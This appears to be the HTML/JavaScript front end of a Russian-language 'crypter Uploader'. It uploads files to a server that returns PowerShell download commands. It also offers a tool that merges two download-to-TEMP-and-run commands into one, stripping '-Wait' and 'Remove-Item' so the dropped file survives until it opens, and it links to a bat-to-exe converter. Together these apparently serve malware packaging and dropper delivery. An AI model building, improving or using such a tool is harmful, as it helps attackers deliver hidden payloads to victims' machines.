<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>crypter Uploader</title>
    <style>
        :root {
            --bg-color: #f0f2f5;
            --container-bg: #ffffff;
            --text-primary: #1e293b;
            --text-secondary: #64748b;
            --accent-color: #6366f1;
            --accent-hover: #4f46e5;
            --border-color: #e2e8f0;
            --shadow-color: rgba(0, 0, 0, 0.1);
            --area-bg: #f8fafc;
            --area-hover: #f1f5f9;
            --cmd-bg: #1e293b;
            --cmd-text: #38bdf8;
            --success-color: #10b981;
        }

        [data-theme="dark"] {
            --bg-color: #0f172a;
            --container-bg: #1e293b;
            --text-primary: #f1f5f9;
            --text-secondary: #94a3b8;
            --accent-color: #818cf8;
            --accent-hover: #6366f1;
            --border-color: #334155;
            --shadow-color: rgba(0, 0, 0, 0.4);
            --area-bg: #0f172a;
            --area-hover: #1e293b;
            --cmd-bg: #020617;
            --cmd-text: #38bdf8;
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            transition: background-color 0.3s ease, border-color 0.3s ease, color 0.3s ease, box-shadow 0.3s ease;
        }

        body {
            font-family: 'Inter', 'Segoe UI', system-ui, sans-serif;
            background-color: var(--bg-color);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
            color: var(--text-primary);
        }

        .container {
            background-color: var(--container-bg);
            border-radius: 24px;
            padding: 40px;
            box-shadow: 0 25px 50px -12px var(--shadow-color);
            max-width: 650px;
            width: 100%;
            position: relative;
            border: 1px solid var(--border-color);
        }

        .theme-toggle {
            position: absolute;
            top: 25px;
            right: 25px;
            background: var(--area-bg);
            border: 1px solid var(--border-color);
            font-size: 20px;
            cursor: pointer;
            width: 45px;
            height: 45px;
            border-radius: 12px;
            display: flex;
            align-items: center;
            justify-content: center;
            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
            box-shadow: 0 4px 6px -1px var(--shadow-color);
        }

        .theme-toggle:hover {
            transform: translateY(-2px);
            background: var(--area-hover);
            border-color: var(--accent-color);
        }

        h1 {
            text-align: center;
            font-size: 28px;
            font-weight: 800;
            letter-spacing: -0.5px;
            margin-bottom: 30px;
            background: linear-gradient(135deg, var(--accent-color), #a855f7);
            -webkit-background-clip: text;
            background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        h1 small {
            -webkit-text-fill-color: var(--text-secondary);
            font-weight: 500;
        }

        .upload-area {
            border: 2px dashed var(--border-color);
            border-radius: 20px;
            padding: 50px 40px;
            text-align: center;
            cursor: pointer;
            background-color: var(--area-bg);
            position: relative;
            overflow: hidden;
        }

        .upload-area::before {
            content: '';
            position: absolute;
            top: 0; left: 0; right: 0; bottom: 0;
            background: var(--accent-color);
            opacity: 0;
            transition: opacity 0.2s ease;
        }

        .upload-area:hover {
            border-color: var(--accent-color);
            background-color: var(--area-hover);
        }

        .upload-area.dragover {
            border-color: var(--accent-color);
            background-color: var(--area-hover);
            transform: scale(0.99);
        }

        .upload-icon {
            font-size: 56px;
            margin-bottom: 16px;
            filter: drop-shadow(0 10px 15px var(--shadow-color));
        }

        .upload-text {
            color: var(--text-secondary);
            font-size: 17px;
            font-weight: 500;
        }

        .upload-text span {
            color: var(--accent-color);
        }

        .file-info {
            margin-top: 24px;
            padding: 20px;
            background-color: var(--area-bg);
            border: 1px solid var(--border-color);
            border-radius: 16px;
            display: none;
            animation: slideUp 0.3s ease-out;
        }

        @keyframes slideUp {
            from { opacity: 0; transform: translateY(10px); }
            to { opacity: 1; transform: translateY(0); }
        }

        .file-info.show { display: block; }

        .file-name {
            font-weight: 600;
            color: var(--text-primary);
            margin-bottom: 4px;
        }

        #fileSize {
            font-size: 13px;
            color: var(--text-secondary);
        }

        .upload-btn {
            width: 100%;
            padding: 16px;
            margin-top: 24px;
            background: linear-gradient(135deg, var(--accent-color), var(--accent-hover));
            color: white;
            border: none;
            border-radius: 14px;
            font-size: 16px;
            font-weight: 700;
            cursor: pointer;
            box-shadow: 0 10px 15px -3px rgba(99, 102, 241, 0.3);
            display: none;
        }

        .upload-btn:hover {
            transform: translateY(-2px);
            filter: brightness(1.1);
            box-shadow: 0 20px 25px -5px rgba(99, 102, 241, 0.4);
        }

        .upload-btn:active { transform: translateY(0); }

        .upload-btn.show { display: block; }

        .upload-btn:disabled {
            opacity: 0.5;
            cursor: not-allowed;
            transform: none !important;
            box-shadow: none !important;
        }

        .result {
            margin-top: 32px;
            padding: 24px;
            background-color: var(--cmd-bg);
            border-radius: 18px;
            border: 1px solid var(--border-color);
            display: none;
            animation: fadeIn 0.4s ease;
        }

        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }

        .result.show { display: block; }

        .result-label {
            font-weight: 700;
            color: #94a3b8;
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 12px;
            display: block;
        }

        .powershell-cmd {
            color: var(--cmd-text);
            font-family: 'JetBrains Mono', 'Fira Code', 'Consolas', monospace;
            font-size: 14px;
            word-break: break-all;
            position: relative;
            cursor: pointer;
            line-height: 1.6;
            text-shadow: 0 0 10px rgba(56, 189, 248, 0.2);
        }

        .powershell-cmd::after {
            content: 'Copy';
            position: absolute;
            top: -5px; right: 0;
            background: var(--accent-color);
            color: white;
            padding: 2px 8px;
            border-radius: 6px;
            font-size: 10px;
            font-family: sans-serif;
            opacity: 0;
            transition: opacity 0.2s;
        }

        .powershell-cmd:hover::after { opacity: 1; }

        .copied {
            position: fixed;
            top: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: var(--success-color);
            color: white;
            padding: 12px 24px;
            border-radius: 12px;
            font-weight: 600;
            font-size: 14px;
            display: none;
            z-index: 1000;
            box-shadow: 0 10px 15px -3px rgba(16, 185, 129, 0.4);
        }

        .merger {
            margin-top: 32px;
            padding: 24px;
            background-color: var(--area-bg);
            border-radius: 20px;
            border: 1px solid var(--border-color);
        }

        .cmd-input {
            width: 100%;
            min-height: 80px;
            margin: 12px 0;
            padding: 16px;
            border: 1px solid var(--border-color);
            border-radius: 12px;
            font-family: 'JetBrains Mono', monospace;
            font-size: 13px;
            resize: vertical;
            background-color: var(--container-bg);
            color: var(--text-primary);
        }

        .cmd-input:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 0 3px rgba(99, 102, 241, 0.1);
        }

        .merge-btn {
            width: 100%;
            padding: 14px;
            background-color: var(--container-bg);
            color: var(--accent-color);
            border: 2px solid var(--accent-color);
            border-radius: 12px;
            cursor: pointer;
            font-size: 15px;
            font-weight: 700;
        }

        .merge-btn:hover {
            background-color: var(--accent-color);
            color: white;
        }

        .progress {
            margin-top: 24px;
            height: 8px;
            background-color: var(--border-color);
            border-radius: 4px;
            overflow: hidden;
            display: none;
        }

        .progress.show { display: block; }

        .progress-bar {
            height: 100%;
            background: linear-gradient(90deg, var(--accent-color), #a855f7);
            width: 0%;
            border-radius: 4px;
        }

        .status {
            text-align: center;
            margin-top: 12px;
            color: var(--text-secondary);
            font-size: 14px;
            font-weight: 500;
            display: none;
        }

        .status.show { display: block; }

        .download-btn {
            background: var(--area-bg);
            color: var(--text-primary);
            padding: 14px 28px;
            border-radius: 14px;
            border: 1px solid var(--border-color);
            text-decoration: none;
            font-weight: 600;
            display: inline-flex;
            align-items: center;
            gap: 10px;
        }

        .download-btn:hover {
            background: var(--area-hover);
            border-color: var(--accent-color);
            transform: translateY(-1px);
        }
    </style>
</head>
<body>
    <div class="container">
        <button class="theme-toggle" id="themeToggle" title="Переключить тему">✨</button>
        <h1>📤 crypter Uploader <small style="font-size: 10px; opacity: 0.5;">v2.2.1</small></h1>
        
        <div class="upload-area" id="uploadArea">
            <div class="upload-icon">📁</div>
            <div class="upload-text">
                Перетащи файл сюда или <span>кликни для выбора</span>
            </div>
        </div>
        
        <input type="file" id="fileInput" multiple>
        
        <div class="file-info" id="fileInfo">
            <div class="file-name" id="fileName"></div>
            <div id="fileSize"></div>
        </div>
        
        <button class="upload-btn" id="uploadBtn">Загрузить на crypter</button>
        
        <div class="progress" id="progress">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="status" id="status"></div>
        
        <div class="result" id="result">
            <span class="result-label">PowerShell команда для скачивания:</span>
            <div class="powershell-cmd" id="powershellCmd"></div>
        </div>
        
        <div class="merger" id="merger">
            <span class="result-label">🔗 Объединение 2 команд в 1</span>
            <textarea class="cmd-input" id="cmd1" placeholder="Вставь первую команду..."></textarea>
            <textarea class="cmd-input" id="cmd2" placeholder="Вставь вторую команду..."></textarea>
            <button class="merge-btn" id="mergeBtn">Объединить команды</button>
            <div class="result" id="mergeResult" style="margin-top: 15px; display: none;">
                <span class="result-label">Объединенная команда:</span>
                <div class="powershell-cmd" id="mergedCmd"></div>
            </div>
        </div>

        <div style="margin-top: 40px; text-align: center; border-top: 1px solid var(--border-color); padding-top: 30px; color: var(--text-secondary); font-size: 14px;">
            Чтобы превратить <b>.bat</b> в <b>.exe</b>, скачайте этот файл: <br><br>
            <a href="https://github.com/HANTERINI/feasdxsz/raw/main/BatToExeConverter.exe" download class="download-btn">
                📥 Скачать Bat To Exe (.exe)
            </a>
        </div>
    </div>
    
    <div class="copied" id="copied">Скопировано!</div>

    <script>
        const uploadArea = document.getElementById('uploadArea');
        const fileInput = document.getElementById('fileInput');
        const fileInfo = document.getElementById('fileInfo');
        const fileName = document.getElementById('fileName');
        const fileSize = document.getElementById('fileSize');
        const uploadBtn = document.getElementById('uploadBtn');
        const progress = document.getElementById('progress');
        const progressBar = document.getElementById('progressBar');
        const status = document.getElementById('status');
        const result = document.getElementById('result');
        const powershellCmd = document.getElementById('powershellCmd');
        const copied = document.getElementById('copied');
        const themeToggle = document.getElementById('themeToggle');

        // Theme management
        const savedTheme = localStorage.getItem('theme') || 'light';
        document.documentElement.setAttribute('data-theme', savedTheme);
        
        themeToggle.addEventListener('click', () => {
            const currentTheme = document.documentElement.getAttribute('data-theme');
            const newTheme = currentTheme === 'light' ? 'dark' : 'light';
            document.documentElement.setAttribute('data-theme', newTheme);
            localStorage.setItem('theme', newTheme);
            themeToggle.textContent = newTheme === 'light' ? '✨' : '🌙';
        });
        
        // Set initial icon
        themeToggle.textContent = savedTheme === 'light' ? '✨' : '🌙';

        let selectedFiles = [];

        uploadArea.addEventListener('click', () => fileInput.click());
        
        function updateFileInfo() {
            if (selectedFiles.length === 0) {
                fileInfo.classList.remove('show');
                uploadBtn.classList.remove('show');
                return;
            }
            
            if (selectedFiles.length === 1) {
                fileName.textContent = selectedFiles[0].name;
                fileSize.textContent = formatFileSize(selectedFiles[0].size);
            } else {
                const totalSize = selectedFiles.reduce((sum, f) => sum + f.size, 0);
                fileName.textContent = `${selectedFiles.length} файла: ${selectedFiles.map(f => f.name).join(', ')}`;
                fileSize.textContent = formatFileSize(totalSize);
            }
            
            fileInfo.classList.add('show');
            uploadBtn.classList.add('show');
            result.classList.remove('show');
        }
        
        uploadArea.addEventListener('dragover', (e) => {
            e.preventDefault();
            uploadArea.classList.add('dragover');
        });
        
        uploadArea.addEventListener('dragleave', () => {
            uploadArea.classList.remove('dragover');
        });
        
        uploadArea.addEventListener('drop', (e) => {
            e.preventDefault();
            uploadArea.classList.remove('dragover');
            const files = e.dataTransfer.files;
            if (files.length > 0) {
                handleFiles(files);
            }
        });

        fileInput.addEventListener('change', (e) => {
            if (e.target.files.length > 0) {
                handleFiles(e.target.files);
            }
        });

        function handleFiles(files) {
            selectedFiles = Array.from(files).slice(0, 2);
            updateFileInfo();
        }

        function formatFileSize(bytes) {
            if (bytes === 0) return '0 Bytes';
            const k = 1024;
            const sizes = ['Bytes', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        uploadBtn.addEventListener('click', async () => {
            if (selectedFiles.length === 0) return;

            uploadBtn.disabled = true;
            progress.classList.add('show');
            status.classList.add('show');
            result.classList.remove('show');

            try {
                status.textContent = 'Подготовка файлов...';
                progressBar.style.width = '30%';

                const uploadPromises = selectedFiles.map(file => {
                    return new Promise((resolve, reject) => {
                        const reader = new FileReader();
                        reader.onload = () => resolve({
                            filename: file.name,
                            content: reader.result.split(',')[1]
                        });
                        reader.onerror = reject;
                        reader.readAsDataURL(file);
                    });
                });

                const filesData = await Promise.all(uploadPromises);
                
                status.textContent = 'Загрузка в облако...';
                progressBar.style.width = '60%';

                const response = await fetch('/api/upload', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ files: filesData })
                });

                progressBar.style.width = '100%';

                if (!response.ok) {
                    const errorData = await response.json().catch(() => ({}));
                    throw new Error(errorData.error || 'Ошибка загрузки');
                }

                const responseData = await response.json();
                
                if (!responseData.success) {
                    throw new Error(responseData.error || 'Ошибка от сервера');
                }
                
                powershellCmd.textContent = responseData.command || '';
                result.classList.add('show');
                status.textContent = 'Готово!';

            } catch (error) {
                status.textContent = 'Ошибка: ' + error.message;
                status.style.color = '#e74c3c';
            } finally {
                uploadBtn.disabled = false;
            }
        });

        powershellCmd.addEventListener('click', () => {
            navigator.clipboard.writeText(powershellCmd.textContent).then(() => {
                copied.classList.add('show');
                setTimeout(() => copied.classList.remove('show'), 2000);
            });
        });
        
        const cmd1 = document.getElementById('cmd1');
        const cmd2 = document.getElementById('cmd2');
        const mergeBtn = document.getElementById('mergeBtn');
        const mergeResult = document.getElementById('mergeResult');
        const mergedCmd = document.getElementById('mergedCmd');
        
        mergeBtn.addEventListener('click', () => {
            let command1 = cmd1.value.trim();
            let command2 = cmd2.value.trim();
            
            if (!command1 || !command2) {
                alert('Вставь обе команды!');
                return;
            }
            
            const cleanAndRepair = (c) => {
                // 1. Убираем внешнюю обертку powershell -c "..."
                let inner = c.replace(/^powershell\s+-c\s+["']/i, '').replace(/["']$/i, '');
                
                // 2. Исправляем пути $env:TEMP
                inner = inner.replace(/\$env:TEMP\\([^\s;]+)/g, "$env:TEMP+'\\$1'");
                
                // 3. Убираем -Wait и Remove-Item, чтобы не блокировать и не удалять файл до открытия
                inner = inner.replace(/\s+-Wait\b/g, '')
                             .replace(/;Remove-Item\s+\$t\d*/g, '');
                
                // 4. Убираем опасные экранированные кавычки \"
                inner = inner.replace(/\\"/g, "'").replace(/"/g, "'");
                
                return inner;
            };
            
            command1 = cleanAndRepair(command1);
            command2 = cleanAndRepair(command2);
            
            // 4. Переименовываем переменные во второй команде ($t -> $t2, $u -> $u2, $d -> $d2)
            command2 = command2.replace(/\$([tud])(\d*)\b/g, (match, p1, p2) => {
                const num = p2 ? parseInt(p2) + 1 : 2;
                return `$${p1}${num}`;
            });
            
            const combined = `powershell -c "${command1};${command2}"`;
            
            mergedCmd.textContent = combined;
            mergeResult.style.display = 'block';
        });
        
        mergedCmd.addEventListener('click', () => {
            navigator.clipboard.writeText(mergedCmd.textContent).then(() => {
                copied.classList.add('show');
                setTimeout(() => copied.classList.remove('show'), 2000);
            });
        });
    </script>
</body>
</html>
